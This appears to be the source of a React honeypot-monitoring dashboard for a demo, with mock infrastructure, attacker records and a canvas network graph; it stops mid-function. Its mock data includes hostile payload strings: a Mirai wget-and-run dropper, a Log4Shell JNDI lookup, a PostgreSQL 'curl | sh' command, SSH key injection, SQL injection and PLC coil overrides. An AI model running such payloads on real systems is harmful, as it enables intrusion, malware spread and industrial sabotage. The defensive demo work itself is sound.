// @ts-nocheck
"use client";

import React, { useState, useEffect, useRef, useMemo, useCallback } from 'react';
import Link from 'next/link';
import {
  ArrowLeft,
  Shield,
  Activity,
  Network,
  Users,
  Terminal,
  BarChart2,
  Server,
  Settings,
  Play,
  Pause,
  RotateCcw,
  Zap,
  Crosshair,
  Maximize2,
  Minimize2,
  Search,
  Download,
  Copy,
  Check,
  X,
  ChevronLeft,
  ChevronRight,
  AlertTriangle,
  Radio,
  Wifi,
  WifiOff,
  Lock,
  Eye,
  Filter,
  ArrowUpDown,
  Clock,
  Globe,
  Cpu,
  HardDrive,
  Sliders,
  Hexagon,
  Layers,
  GitCommit,
  RefreshCw,
  Send,
  Sun,
  Moon,
  ArrowUpRight,
  Compass,
  Code,
  CheckCircle2,
  CornerDownRight
} from 'lucide-react';
import {
  ResponsiveContainer,
  AreaChart,
  Area,
  BarChart,
  Bar,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip as RechartsTooltip,
  Cell
} from 'recharts';

// ============================================================================
// SELF-CONTAINED CLASSNAME UTILITY (Prevents '@/lib/utils' resolution errors)
// ============================================================================
export function cn(...inputs) {
  return inputs
    .flat(Infinity)
    .filter((x) => typeof x === 'string' && x.trim().length > 0)
    .join(' ');
}

// ============================================================================
// DESIGN SYSTEM TOKENS — OBSIDIAN DARK & BONE LIGHT BRUTALIST PALETTES
// ============================================================================
const THEMES = {
  dark: {
    bg: '#0B0B0C',        // Main App Obsidian Background
    surface: '#141416',   // Sidebar & Card Surface
    elevated: '#18181B',  // Inner Card / Input Surface
    muted: '#1E1E22',     // Hover / Muted Surface
    text: '#F1EFE9',      // Bone-white Primary Text
    secondary: '#9A9891', // Muted Technical Labels
    border: '#27272A',    // Crisp 1px Structural Borders
    canvas: '#080809',    // Deep Topology Canvas Background
    grid: '#141417',      // Subtle Canvas Grid Lines
    accent: '#FF493D',    // Alert / Critical Red
  },
  light: {
    bg: '#F1EFE9',
    surface: '#D8D5CE',
    elevated: '#E8E5DE',
    muted: '#CFCBC2',
    text: '#171717',
    secondary: '#66645F',
    border: '#B8B5AE',
    canvas: '#121214',
    grid: '#1F1F23',
    accent: '#FF493D',
  },
};

// Keep TOKENS reference for canvas rendering primitives
const TOKENS = {
  bg: '#F1EFE9',
  surface: '#D8D5CE',
  muted: '#1E1E22',
  text: '#080809',
  secondary: '#9A9891',
  border: '#27272A',
  accent: '#FF493D',
};

// ============================================================================
// INITIAL INFRASTRUCTURE: PROTECTED SERVERS, GATEWAYS, HONEYPOTS, ATTACKERS
// ============================================================================
const INITIAL_INFRA_NODES = [
  // Core Gateway / Firewall Router
  {
    id: 'gw-edge-01',
    name: 'edge-ingress-gw-01',
    ip: '10.240.0.1',
    nodeType: 'normal',
    role: 'BGP Edge Ingress Router',
    status: 'Online',
    region: 'eu-central-1',
    protocols: ['BGP', 'TCP', 'UDP', 'ICMP'],
    connections: 4820,
    firstSeen: '2025-01-01 00:00:00 UTC',
    lastSeen: 'Active',
    x: 0,
    y: 0,
  },
  // Protected Production Servers (Shielded Square Nodes)
  {
    id: 'prod-vault-01',
    name: 'prod-ledger-db-01',
    ip: '10.240.10.50:5432',
    nodeType: 'protected',
    role: 'Protected Core Financial Ledger',
    status: 'Protected / Isolated',
    region: 'eu-central-1',
    protocols: ['PGSQL/TLSv1.3', 'mTLS'],
    connections: 312,
    firstSeen: '2025-01-01 00:00:00 UTC',
    lastSeen: 'Active',
    x: -260,
    y: 0,
  },
  {
    id: 'prod-auth-02',
    name: 'prod-iam-signer-02',
    ip: '10.240.10.65:8443',
    nodeType: 'protected',
    role: 'Protected HSM Identity Authority',
    status: 'Protected / Isolated',
    region: 'us-east-1',
    protocols: ['HTTPS/mTLS', 'gRPC'],
    connections: 518,
    firstSeen: '2025-01-01 00:00:00 UTC',
    lastSeen: 'Active',
    x: 260,
    y: 0,
  },
];

const INITIAL_HONEYPOTS = [
  {
    id: 'honeypot-ssh-01',
    name: 'honeypot-ssh-01',
    ip: '10.240.1.10:22',
    nodeType: 'honeypot',
    type: 'High-Interaction SSH Decoy',
    service: 'OpenSSH 8.9p1 (Cowrie Kernel Hook)',
    protocols: ['SSH', 'TCP/22', 'SFTP'],
    region: 'eu-central-1 (Frankfurt)',
    status: 'Online',
    severity: 'low',
    uptime: '1d 04h 12m',
    totalInteractions: 0,
    activeSessions: 0,
    lastActivity: 'Idle / Listening',
    cpu: 3,
    memory: 12,
    x: -135,
    y: -115,
  },
  {
    id: 'honeypot-http-02',
    name: 'honeypot-http-02',
    ip: '10.240.1.22:443',
    nodeType: 'honeypot',
    type: 'Web API & GraphQL Canary',
    service: 'Envoy / Financial Portal Decoy',
    protocols: ['HTTPS', 'HTTP/2', 'GraphQL', 'TCP/443'],
    region: 'us-east-1 (Virginia)',
    status: 'Online',
    severity: 'low',
    uptime: '1d 04h 12m',
    totalInteractions: 0,
    activeSessions: 0,
    lastActivity: 'Idle / Listening',
    cpu: 4,
    memory: 14,
    x: 135,
    y: -115,
  },
  {
    id: 'honeypot-redis-03',
    name: 'honeypot-redis-03',
    ip: '10.240.2.15:6379',
    nodeType: 'honeypot',
    type: 'In-Memory Keystore Sandbox',
    service: 'Redis 7.0 Unauthenticated Trap',
    protocols: ['RESP', 'TCP/6379'],
    region: 'ap-northeast-1 (Tokyo)',
    status: 'Online',
    severity: 'low',
    uptime: '1d 04h 12m',
    totalInteractions: 0,
    activeSessions: 0,
    lastActivity: 'Idle / Listening',
    cpu: 2,
    memory: 10,
    x: -135,
    y: 115,
  },
  {
    id: 'honeypot-ics-04',
    name: 'honeypot-ics-04',
    ip: '10.240.3.88:502',
    nodeType: 'honeypot',
    type: 'Industrial SCADA PLC Decoy',
    service: 'Siemens S7 / Modbus TCP Emulator',
    protocols: ['Modbus', 'S7COMM', 'TCP/502', 'TCP/102'],
    region: 'eu-west-1 (Dublin)',
    status: 'Online',
    severity: 'low',
    uptime: '1d 04h 12m',
    totalInteractions: 0,
    activeSessions: 0,
    lastActivity: 'Idle / Listening',
    cpu: 5,
    memory: 16,
    x: 135,
    y: 115,
  },
  {
    id: 'honeypot-postgres-05',
    name: 'honeypot-postgres-05',
    ip: '10.240.4.19:5432',
    nodeType: 'honeypot',
    type: 'Synthetic SQL Ledger Canary',
    service: 'PostgreSQL 15 Wire Interceptor',
    protocols: ['PGSQL', 'TCP/5432'],
    region: 'us-west-2 (Oregon)',
    status: 'Online',
    severity: 'low',
    uptime: '1d 04h 12m',
    totalInteractions: 0,
    activeSessions: 0,
    lastActivity: 'Idle / Listening',
    cpu: 3,
    memory: 15,
    x: 0,
    y: -155,
  },
  {
    id: 'honeypot-telnet-06',
    name: 'honeypot-telnet-06',
    ip: '10.240.5.04:23',
    nodeType: 'honeypot',
    type: 'IoT BusyBox Dropper Trap',
    service: 'MIPS BusyBox Telnet Sandbox',
    protocols: ['Telnet', 'TCP/23', 'TCP/2323'],
    region: 'ap-southeast-1 (Singapore)',
    status: 'Online',
    severity: 'low',
    uptime: '1d 04h 12m',
    totalInteractions: 0,
    activeSessions: 0,
    lastActivity: 'Idle / Listening',
    cpu: 2,
    memory: 8,
    x: 0,
    y: 155,
  },
  {
    id: 'honeypot-mqtt-07',
    name: 'honeypot-mqtt-07',
    ip: '10.240.5.18:1883',
    nodeType: 'honeypot',
    type: 'IoT Telemetry Broker Canary',
    service: 'Eclipse Mosquitto Decoy Broker',
    protocols: ['MQTT', 'TCP/1883'],
    region: 'eu-west-1 (Dublin)',
    status: 'Online',
    severity: 'low',
    uptime: '1d 04h 12m',
    totalInteractions: 0,
    activeSessions: 0,
    lastActivity: 'Idle / Listening',
    cpu: 2,
    memory: 10,
    x: -160,
    y: 0,
  },
  {
    id: 'honeypot-vault-08',
    name: 'honeypot-vault-08',
    ip: '10.240.6.12:8000',
    nodeType: 'honeypot',
    type: 'Cold Vault Exfiltration Canary',
    service: 'Adaptive Tarpit Exfil Trapper',
    protocols: ['HTTP', 'S3', 'TCP/8000'],
    region: 'us-east-1 (Virginia)',
    status: 'Online',
    severity: 'low',
    uptime: '1d 04h 12m',
    totalInteractions: 0,
    activeSessions: 0,
    lastActivity: 'Idle / Listening',
    cpu: 4,
    memory: 18,
    x: 160,
    y: 0,
  },
];

const INITIAL_ATTACKERS = [
  {
    id: 'att-1',
    ip: '198.51.100.42',
    nodeType: 'attacker',
    asn: 'AS24940 Hetzner Region',
    attackType: 'SSH Brute-Force & Ed25519 Key Injection',
    firstSeen: '14:12:04 UTC',
    lastSeen: '14:30:11 UTC',
    attempts: 418,
    targetedHoneypots: ['honeypot-ssh-01'],
    protocols: ['SSH', 'TCP/22'],
    ports: [22, 2222],
    severity: 'high',
    status: 'Active',
    threatScore: 84,
    payloads: [
      'SSH-2.0-libssh2_1.10.0',
      'POST /auth user=root pass=xc991!a (418 retries)',
      'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5..." >> ~/.ssh/authorized_keys',
    ],
    x: -295,
    y: -175,
  },
  {
    id: 'att-2',
    ip: '203.0.113.88',
    nodeType: 'attacker',
    asn: 'AS60781 NL Transit',
    attackType: 'Redis LUA Sandbox Escape & Cron Write',
    firstSeen: '13:55:19 UTC',
    lastSeen: '14:30:02 UTC',
    attempts: 129,
    targetedHoneypots: ['honeypot-redis-03'],
    protocols: ['RESP', 'TCP/6379'],
    ports: [6379],
    severity: 'critical',
    status: 'Contained',
    threatScore: 96,
    payloads: [
      'CONFIG SET dir /var/spool/cron',
      'EVAL "local io_l = package.loadlib(\'/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\', \'luaopen_io\');..." 0',
      '[NAMESPACE ISOLATION] Syscall write() trapped in microVM ringbuffer',
    ],
    x: -290,
    y: 180,
  },
  {
    id: 'att-3',
    ip: '192.0.2.174',
    nodeType: 'attacker',
    asn: 'AS14618 Compute East',
    attackType: 'GraphQL Introspection & Time-Blind SQLi',
    firstSeen: '14:18:30 UTC',
    lastSeen: '14:29:44 UTC',
    attempts: 892,
    targetedHoneypots: ['honeypot-http-02', 'honeypot-postgres-05'],
    protocols: ['HTTPS', 'GraphQL', 'PGSQL'],
    ports: [443, 5432],
    severity: 'high',
    status: 'Suspicious',
    threatScore: 76,
    payloads: [
      'POST /graphql {"query":"{__schema{types{name,fields{name}}}}"}',
      'GET /api/v2/ledger?acct=1092%27%20UNION%20SELECT%20pg_sleep(5)--',
    ],
    x: 295,
    y: -170,
  },
  {
    id: 'att-4',
    ip: '198.51.100.219',
    nodeType: 'attacker',
    asn: 'AS45102 APAC Backbone',
    attackType: 'Modbus Function 0x05 Coil Override Exploit',
    firstSeen: '14:21:10 UTC',
    lastSeen: '14:30:18 UTC',
    attempts: 64,
    targetedHoneypots: ['honeypot-ics-04'],
    protocols: ['Modbus', 'S7COMM', 'TCP/502'],
    ports: [502, 102],
    severity: 'critical',
    status: 'Malicious',
    threatScore: 95,
    payloads: [
      'MODBUS UnitID=0x01 Func=0x05 WriteSingleCoil Addr=0x0040 Val=0xFF00',
      'S7COMM Job: Stop_CPU_Function (0x29) PLC_Control',
    ],
    x: 295,
    y: 175,
  },
  {
    id: 'att-5',
    ip: '203.0.113.15',
    nodeType: 'attacker',
    asn: 'AS9009 M247 Transit',
    attackType: 'SYN Stealth Service Enumeration',
    firstSeen: '14:25:00 UTC',
    lastSeen: '14:29:12 UTC',
    attempts: 54,
    targetedHoneypots: ['honeypot-postgres-05'],
    protocols: ['TCP', 'PGSQL'],
    ports: [22, 80, 443, 5432],
    severity: 'low',
    status: 'Observed',
    threatScore: 28,
    payloads: [
      'TCP SYN Window=1024 MSS=1460',
      'PostgreSQL SSLRequest packet 0x04d2162f',
    ],
    x: -85,
    y: -235,
  },
  {
    id: 'att-6',
    ip: '192.0.2.91',
    nodeType: 'attacker',
    asn: 'AS28573 LATAM Edge',
    attackType: 'Mirai MIPS ELF Botnet Loader',
    firstSeen: '14:04:11 UTC',
    lastSeen: '14:28:59 UTC',
    attempts: 312,
    targetedHoneypots: ['honeypot-telnet-06'],
    protocols: ['Telnet', 'HTTP'],
    ports: [23, 2323],
    severity: 'critical',
    status: 'Contained',
    threatScore: 92,
    payloads: [
      'cd /tmp || cd /var/run; wget http://192.0.2.91/bins/mirai.mips; chmod 777 mirai.mips; ./mirai.mips',
      '[NAMESPACE ISOLATION] ELF binary sha256:9f84e2c... quarantined inside virtualized Honeytrap cage',
    ],
    x: 95,
    y: 235,
  },
];

const INITIAL_EVENTS = [
  {
    id: 'EVT-9048',
    timestamp: '14:30:18.412',
    severity: 'critical',
    source: '198.51.100.219',
    destination: 'honeypot-ics-04',
    protocol: 'Modbus/TCP',
    type: 'EXPLOIT_ATTEMPT',
    description: 'Modbus Function 0x05 WriteSingleCoil override on safety PLC register 0x0040',
    raw: '{"event_id":"EVT-9048","proto":"modbus","unit_id":1,"func":5,"reg":"0x0040","payload":"FF00","mitre":"T0855"}',
  },
  {
    id: 'EVT-9047',
    timestamp: '14:30:02.109',
    severity: 'critical',
    source: '203.0.113.88',
    destination: 'honeypot-redis-03',
    protocol: 'RESP/6379',
    type: 'SESSION_CONTAINED',
    description: 'Attacker session isolated in microVM namespace — LUA sandbox escape blocked',
    raw: '{"event_id":"EVT-9047","action":"namespace_lock","isolation_ns":"netns-trap-88","pcap_bytes":48290}',
  },
  {
    id: 'EVT-9046',
    timestamp: '14:29:51.884',
    severity: 'high',
    source: '198.51.100.42',
    destination: 'honeypot-ssh-01',
    protocol: 'SSHv2',
    type: 'BRUTE_FORCE',
    description: 'High-velocity SSH credential stuffing (42 req/s) + ed25519 authorized_keys write',
    raw: '{"event_id":"EVT-9046","service":"ssh","user":"root","attempts":418,"key_fp":"SHA256:k9L2mP..."}',
  },
  {
    id: 'EVT-9045',
    timestamp: '14:29:44.302',
    severity: 'high',
    source: '192.0.2.174',
    destination: 'honeypot-http-02',
    protocol: 'HTTPS/GraphQL',
    type: 'SUSPICIOUS_QUERY',
    description: 'GraphQL schema introspection & time-based blind SQLi on /api/v2/ledger',
    raw: '{"event_id":"EVT-9045","method":"POST","uri":"/graphql","waf_sig":"SQLI-PG-SLEEP-04","latency_ms":5012}',
  },
  {
    id: 'EVT-9044',
    timestamp: '14:29:12.018',
    severity: 'info',
    source: '203.0.113.15',
    destination: 'honeypot-postgres-05',
    protocol: 'TCP/5432',
    type: 'RECON_SCAN',
    description: 'Inbound TCP SYN probe and SSLRequest negotiation on port 5432',
    raw: '{"event_id":"EVT-9044","tcp_flags":"SYN","window":1024,"ttl":53,"dst_port":5432}',
  },
  {
    id: 'EVT-9043',
    timestamp: '14:28:59.650',
    severity: 'critical',
    source: '192.0.2.91',
    destination: 'honeypot-telnet-06',
    protocol: 'Telnet/23',
    type: 'SESSION_CONTAINED',
    description: 'Mirai MIPS dropper quarantined & session rerouted to synthetic network sink',
    raw: '{"event_id":"EVT-9043","binary":"mirai.mips","sha256":"9f84e2c11a8b...","status":"CONTAINED"}',
  },
];

// Deterministic Demo Scenario Queue for repeatable Hackathon/SOC demonstrations
const DETERMINISTIC_DEMO_SCENARIOS = [
  {
    ip: '198.51.100.163',
    asn: 'AS12389 Transit North',
    attackType: 'OpenSSH Pre-Auth Heap Overflow (CVE-2024-6387)',
    targetHoneypot: 'honeypot-ssh-01',
    protocol: 'SSHv2',
    ports: [22],
    severity: 'critical',
    threatScore: 94,
    payload: 'SSH-2.0-regreSSHion-HeapSpray-0x909090',
    x: -265,
    y: -45,
  },
  {
    ip: '203.0.113.204',
    asn: 'AS37963 Cloud East',
    attackType: 'JNDI Remote Class Deserialization',
    targetHoneypot: 'honeypot-http-02',
    protocol: 'HTTPS',
    ports: [443, 8080],
    severity: 'critical',
    threatScore: 91,
    payload: '${jndi:ldap://203.0.113.204:1389/ExploitClass}',
    x: 265,
    y: -45,
  },
  {
    ip: '192.0.2.231',
    asn: 'AS131279 Industrial Relay',
    attackType: 'S7COMM PLC OB1 Ladder Logic Injection',
    targetHoneypot: 'honeypot-ics-04',
    protocol: 'S7COMM',
    ports: [102, 502],
    severity: 'critical',
    threatScore: 98,
    payload: 'S7COMM BlockDownload OB1 MaliciousCoilOverride',
    x: 245,
    y: 75,
  },
  {
    ip: '198.51.100.99',
    asn: 'AS44244 Core Telecom',
    attackType: 'PostgreSQL COPY FROM PROGRAM Command Exec',
    targetHoneypot: 'honeypot-postgres-05',
    protocol: 'PGSQL',
    ports: [5432],
    severity: 'high',
    threatScore: 87,
    payload: "COPY cmd_exec FROM PROGRAM 'curl -s http://198.51.100.99/sh | sh';",
    x: 85,
    y: -235,
  },
];

const ANALYTICS_SERIES = {
  '1H': [
    { time: '14:00', attacks: 0, contained: 0, critical: 0 },
    { time: '14:10', attacks: 0, contained: 0, critical: 0 },
    { time: '14:20', attacks: 0, contained: 0, critical: 0 },
    { time: '14:30', attacks: 0, contained: 0, critical: 0 },
  ],
  '24H': [
    { time: '00:00', attacks: 0, contained: 0, critical: 0 },
    { time: '06:00', attacks: 0, contained: 0, critical: 0 },
    { time: '12:00', attacks: 0, contained: 0, critical: 0 },
    { time: '18:00', attacks: 0, contained: 0, critical: 0 },
    { time: '23:59', attacks: 0, contained: 0, critical: 0 },
  ],
  '7D': [
    { time: 'MON', attacks: 0, contained: 0, critical: 0 },
    { time: 'TUE', attacks: 0, contained: 0, critical: 0 },
    { time: 'WED', attacks: 0, contained: 0, critical: 0 },
    { time: 'THU', attacks: 0, contained: 0, critical: 0 },
    { time: 'FRI', attacks: 0, contained: 0, critical: 0 },
    { time: 'SAT', attacks: 0, contained: 0, critical: 0 },
    { time: 'SUN', attacks: 0, contained: 0, critical: 0 },
  ],
};

// ============================================================================
// SMOOTH NUMBER TRANSITION COMPONENT
// ============================================================================
function AnimatedMetric({ value, reducedMotion }) {
  const [display, setDisplay] = useState(value);
  const prevRef = useRef(value);

  useEffect(() => {
    if (reducedMotion) {
      setDisplay(value);
      prevRef.current = value;
      return;
    }
    const start = prevRef.current;
    const end = value;
    if (start === end) return;
    const duration = 360;
    const startTime = performance.now();
    let raf;

    const step = (now) => {
      const p = Math.min((now - startTime) / duration, 1);
      const eased = 1 - Math.pow(1 - p, 3);
      setDisplay(Math.round(start + (end - start) * eased));
      if (p < 1) {
        raf = requestAnimationFrame(step);
      } else {
        prevRef.current = end;
      }
    };
    raf = requestAnimationFrame(step);
    return () => cancelAnimationFrame(raf);
  }, [value, reducedMotion]);

  return <span>{display.toLocaleString()}</span>;
}

// ============================================================================
// INTERACTIVE TOPOLOGY GRAPH (OVERVIEW & NETWORK INTELLIGENCE)
// Supports 4 distinct geometric entity types (Attacker Diamond/Reticle,
// Honeypot Hexagon, Protected Server Shielded Square, Normal Gateway Circle)
// plus clickable nodes AND clickable connection edges.
// ============================================================================

// ============================================================================
// HONEYPOT NODE RESOLVER: Maps endpoint/stage to actual honeypot on graph
// ============================================================================
function resolveHoneypotId(dest: any): string {
  if (!dest) return 'honeypot-ssh-01';
  const d = String(dest).toLowerCase();
  if (d.includes('postgres') || d.includes('pg') || d.includes('legacy-query') || d.includes('5432') || d.includes('sql')) {
    return 'honeypot-postgres-05';
  }
  if (d.includes('http') || d.includes('git') || d.includes('env') || d.includes('graphql') || d.includes('443') || d.includes('web')) {
    return 'honeypot-http-02';
  }
  if (d.includes('ssh') || d.includes('shell') || d.includes('jumpbox') || d.includes('22')) {
    return 'honeypot-ssh-01';
  }
  if (d.includes('redis') || d.includes('6379')) {
    return 'honeypot-redis-03';
  }
  if (d.includes('ics') || d.includes('modbus') || d.includes('scada') || d.includes('502')) {
    return 'honeypot-ics-04';
  }
  if (d.includes('telnet') || d.includes('busybox') || d.includes('23')) {
    return 'honeypot-telnet-06';
  }
  if (d.includes('mqtt') || d.includes('1883')) {
    return 'honeypot-mqtt-07';
  }
  if (d.includes('vault') || d.includes('s3') || d.includes('export') || d.includes('treasury')) {
    return 'honeypot-vault-08';
  }
  return 'honeypot-ssh-01';
}

function NetworkTopologyCanvas({
  infraNodes,
  honeypots,
  attackers,
  selectedEntity,
  onSelectEntity,
  nodeCategoryFilter,
  setNodeCategoryFilter,
  severityFilter,
  setSeverityFilter,
  honeypotFilter,
  setHoneypotFilter,
  graphSearch,
  setGraphSearch,
  isPaused,
  setIsPaused,
  reducedMotion,
  isFullscreen,
  setIsFullscreen,
  compactHeight = false,
}) {
  const canvasRef = useRef(null);
  const transformRef = useRef({ x: 0, y: 0, scale: compactHeight ? 0.88 : 1 });
  const dragRef = useRef({
    isPanning: false,
    dragNodeId: null,
    startX: 0,
    startY: 0,
  });
  const positionsRef = useRef({});
  const [hoveredItem, setHoveredItem] = useState(null);

  // Sync node coordinates into mutable drag map
  useEffect(() => {
    [...infraNodes, ...honeypots, ...attackers].forEach((n) => {
      if (!positionsRef.current[n.id]) {
        positionsRef.current[n.id] = {
          x: n.x || 0,
          y: n.y || 0,
          spawnTime: performance.now(),
        };
      }
    });
  }, [infraNodes, honeypots, attackers]);

  // Filter visible nodes based on operator controls
  const filteredAttackers = useMemo(() => {
    return attackers.filter((att) => {
      if (nodeCategoryFilter !== 'ALL' && nodeCategoryFilter !== 'ATTACKER') return false;
      if (honeypotFilter !== 'ALL' && !att.targetedHoneypots.includes(honeypotFilter))
        return false;
      if (severityFilter === 'CRITICAL' && att.severity !== 'critical') return false;
      if (
        severityFilter === 'SUSPICIOUS' &&
        att.status !== 'Suspicious' &&
        att.status !== 'Active' &&
        att.status !== 'Malicious'
      )
        return false;
      if (severityFilter === 'CONTAINED' && att.status !== 'Contained') return false;
      if (
        graphSearch &&
        !att.ip.toLowerCase().includes(graphSearch.toLowerCase()) &&
        !att.attackType.toLowerCase().includes(graphSearch.toLowerCase())
      )
        return false;
      return true;
    });
  }, [attackers, nodeCategoryFilter, honeypotFilter, severityFilter, graphSearch]);

  const filteredHoneypots = useMemo(() => {
    return honeypots.filter((hp) => {
      if (nodeCategoryFilter !== 'ALL' && nodeCategoryFilter !== 'HONEYPOT') return false;
      if (honeypotFilter !== 'ALL' && hp.id !== honeypotFilter) return false;
      if (
        graphSearch &&
        !hp.name.toLowerCase().includes(graphSearch.toLowerCase()) &&
        !hp.ip.toLowerCase().includes(graphSearch.toLowerCase())
      )
        return false;
      return true;
    });
  }, [honeypots, nodeCategoryFilter, honeypotFilter, graphSearch]);

  const filteredInfra = useMemo(() => {
    return infraNodes.filter((inf) => {
      if (
        nodeCategoryFilter !== 'ALL' &&
        nodeCategoryFilter !== 'PROTECTED' &&
        inf.nodeType === 'protected'
      )
        return false;
      if (
        nodeCategoryFilter !== 'ALL' &&
        nodeCategoryFilter !== 'NORMAL' &&
        inf.nodeType === 'normal'
      )
        return false;
      if (
        graphSearch &&
        !inf.name.toLowerCase().includes(graphSearch.toLowerCase()) &&
        !inf.ip.toLowerCase().includes(graphSearch.toLowerCase())
      )
        return false;
      return true;
    });
  }, [infraNodes, nodeCategoryFilter, graphSearch]);

  // Build list of active connection edges for rendering & hit-testing
  const edges = useMemo(() => {
    const list = [];
    // Structural core links: Gateway -> Protected Servers & Gateway -> Honeypots
    const gw = filteredInfra.find((n) => n.id === 'gw-edge-01');
    if (gw) {
      filteredInfra
        .filter((n) => n.id !== 'gw-edge-01')
        .forEach((srv) => {
          list.push({
            id: `edge-${gw.id}-${srv.id}`,
            sourceId: gw.id,
            targetId: srv.id,
            sourceLabel: gw.name,
            targetLabel: srv.name,
            edgeType: 'structural',
            protocol: srv.protocols[0],
            status: 'Protected mTLS Tunnel',
            packetRate: '180 pkt/s',
          });
        });

      filteredHoneypots.forEach((hp) => {
        list.push({
          id: `edge-${gw.id}-${hp.id}`,
          sourceId: gw.id,
          targetId: hp.id,
          sourceLabel: gw.name,
          targetLabel: hp.name,
          edgeType: 'normal',
          protocol: hp.protocols[0],
          status: 'Decoy Telemetry Mirror',
          packetRate: '65 pkt/s',
        });
      });
    }

    // Attacker -> Honeypot connections: Always connects to the exact honeypot currently targeted!
    filteredAttackers.forEach((att) => {
      const rawTarget = att.currentTargetHoneypot || (att.targetedHoneypots && att.targetedHoneypots[0]) || 'honeypot-ssh-01';
      const targetHp = resolveHoneypotId(rawTarget);
      const isContained = att.status === 'Contained';
      const isHighThreat =
        att.severity === 'critical' ||
        att.severity === 'high' ||
        att.status === 'Malicious' ||
        att.status === 'Suspicious';

      list.push({
        id: `edge-${att.id}-${targetHp}`,
        sourceId: att.id,
        targetId: targetHp,
        sourceLabel: att.ip,
        targetLabel: targetHp,
        edgeType: isContained
          ? 'historical'
          : isHighThreat
          ? 'malicious'
          : 'normal',
        protocol: (att.protocols && att.protocols.join(' / ')) || 'TCP',
        status: isContained
          ? 'Isolated in MicroVM Cage (504 WAF Exit)'
          : `${att.attackType} → ${targetHp}`,
        packetRate: isContained ? '0 pkt/s (Blocked)' : `${att.attempts} frames`,
        attacker: att,
      });
    });

    return list;
  }, [filteredInfra, filteredHoneypots, filteredAttackers]);

  const resetView = () => {
    transformRef.current = { x: 0, y: 0, scale: compactHeight ? 0.88 : 1 };
    [...infraNodes, ...honeypots, ...attackers].forEach((n) => {
      positionsRef.current[n.id] = {
        x: n.x || 0,
        y: n.y || 0,
        spawnTime: performance.now() - 3000,
      };
    });
  };

  const screenToWorld = (sx, sy, w, h) => {
    const { x, y, scale } = transformRef.current;
    return {
      wx: (sx - w / 2 - x) / scale,
      wy: (sy - h / 2 - y) / scale,
    };
  };

  // Distance from point (px, py) to segment (x1, y1)-(x2, y2) for clicking connections
  const distToSegment = (px, py, x1, y1, x2, y2) => {
    const l2 = (x2 - x1) ** 2 + (y2 - y1) ** 2;
    if (l2 === 0) return Math.hypot(px - x1, py - y1);
    let t = ((px - x1) * (x2 - x1) + (py - y1) * (y2 - y1)) / l2;
    t = Math.max(0, Math.min(1, t));
    return Math.hypot(px - (x1 + t * (x2 - x1)), py - (y1 + t * (y2 - y1)));
  };

  const drawPolygon = (ctx, cx, cy, r, sides, rot = 0) => {
    ctx.beginPath();
    for (let i = 0; i < sides; i++) {
      const a = rot + (i * 2 * Math.PI) / sides;
      const x = cx + r * Math.cos(a);
      const y = cy + r * Math.sin(a);
      if (i === 0) ctx.moveTo(x, y);
      else ctx.lineTo(x, y);
    }
    ctx.closePath();
  };

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    let raf;

    const render = (now) => {
      raf = requestAnimationFrame(render);
      const parent = canvas.parentElement;
      if (!parent) return;

      const dpr = Math.min(window.devicePixelRatio || 1, 2);
      const w = parent.clientWidth;
      const h = parent.clientHeight;
      if (canvas.width !== w * dpr || canvas.height !== h * dpr) {
        canvas.width = w * dpr;
        canvas.height = h * dpr;
      }

      ctx.save();
      ctx.scale(dpr, dpr);

      // 1. Dark Near-Black Topology Canvas (#080809)
      ctx.fillStyle = '#080809';
      ctx.fillRect(0, 0, w, h);

      const { x: panX, y: panY, scale } = transformRef.current;

      // Subtle architectural grid
      ctx.strokeStyle = '#151518';
      ctx.lineWidth = 1;
      const step = 56 * scale;
      const ox = ((w / 2 + panX) % step + step) % step;
      const oy = ((h / 2 + panY) % step + step) % step;
      for (let gx = ox; gx < w; gx += step) {
        ctx.beginPath();
        ctx.moveTo(gx, 0);
        ctx.lineTo(gx, h);
        ctx.stroke();
      }
      for (let gy = oy; gy < h; gy += step) {
        ctx.beginPath();
        ctx.moveTo(0, gy);
        ctx.lineTo(w, gy);
        ctx.stroke();
      }

      ctx.translate(w / 2 + panX, h / 2 + panY);
      ctx.scale(scale, scale);

      // 2. Render Network Connections & Directional Traffic Trails
      edges.forEach((edge, idx) => {
        const p1 = positionsRef.current[edge.sourceId] || { x: 0, y: 0 };
        const p2 = positionsRef.current[edge.targetId] || { x: 0, y: 0 };
        const isSelected =
          selectedEntity?.kind === 'EDGE' && selectedEntity?.data?.id === edge.id;

        ctx.beginPath();
        ctx.moveTo(p1.x, p1.y);
        ctx.lineTo(p2.x, p2.y);

        if (edge.edgeType === 'malicious') {
          ctx.strokeStyle = TOKENS.accent;
          ctx.lineWidth = isSelected ? 2.8 : 1.7;
          ctx.setLineDash([]);
        } else if (edge.edgeType === 'historical') {
          // Muted red for historical or contained activity
          ctx.strokeStyle = 'rgba(255, 73, 61, 0.38)';
          ctx.lineWidth = isSelected ? 2.2 : 1.2;
          ctx.setLineDash([4, 5]);
        } else if (edge.edgeType === 'structural') {
          ctx.strokeStyle = 'rgba(216, 213, 206, 0.22)';
          ctx.lineWidth = isSelected ? 2.2 : 1.1;
          ctx.setLineDash([2, 4]);
        } else {
          ctx.strokeStyle = 'rgba(241, 239, 233, 0.30)';
          ctx.lineWidth = isSelected ? 2.2 : 1.1;
          ctx.setLineDash([]);
        }
        ctx.stroke();
        ctx.setLineDash([]);

        // Animated traffic trails (stopped when paused or reducedMotion enabled)
        if (!isPaused && !reducedMotion && edge.edgeType !== 'historical') {
          const speed = edge.edgeType === 'malicious' ? 0.0007 : 0.00032;
          const count = edge.edgeType === 'malicious' ? 3 : 2;
          for (let i = 0; i < count; i++) {
            const t = (now * speed + i / count + idx * 0.19) % 1;
            const tx = p1.x + (p2.x - p1.x) * t;
            const ty = p1.y + (p2.y - p1.y) * t;

            ctx.beginPath();
            ctx.arc(tx, ty, edge.edgeType === 'malicious' ? 2.8 : 2, 0, Math.PI * 2);
            ctx.fillStyle =
              edge.edgeType === 'malicious' ? TOKENS.accent : TOKENS.bg;
            ctx.fill();
          }
        }
      });

      // 3. Render Normal Gateway & Protected Infrastructure Nodes
      filteredInfra.forEach((node) => {
        const pos = positionsRef.current[node.id] || { x: node.x, y: node.y };
        const isSelected =
          selectedEntity?.kind === 'INFRA' && selectedEntity?.data?.id === node.id;

        if (node.nodeType === 'protected') {
          // Protected Server: Crisp Shielded Square Marker
          const sz = isSelected ? 18 : 15;
          ctx.fillStyle = '#171717';
